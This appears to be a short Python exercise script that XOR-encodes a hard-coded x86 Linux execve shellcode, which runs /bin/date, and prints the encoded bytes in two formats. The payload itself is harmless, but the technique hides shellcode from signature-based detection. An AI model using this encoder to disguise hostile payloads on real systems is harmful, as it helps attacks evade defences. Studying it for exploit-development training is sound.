shellcode=(b"\xeb\x12\x5b\x31\xc0\x50\x89\xe5\x88\x43\x09\x53\x89\xe1\x89\xea\xb0\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x74\x65\x41")
encoded = ""
encoded2= ""

print("Encoded shellcode")

for x in bytearray(shellcode):
    y=x^0xAA
    encoded = encoded + "\\x"
    encoded = encoded + ("%02x" % y)

    encoded2 = encoded2 + "0x"
    encoded2 = encoded2 + ("%2x," % y)

print(encoded)
print(encoded2)

print("Length of encoded string is " + str(len(bytearray(shellcode))))
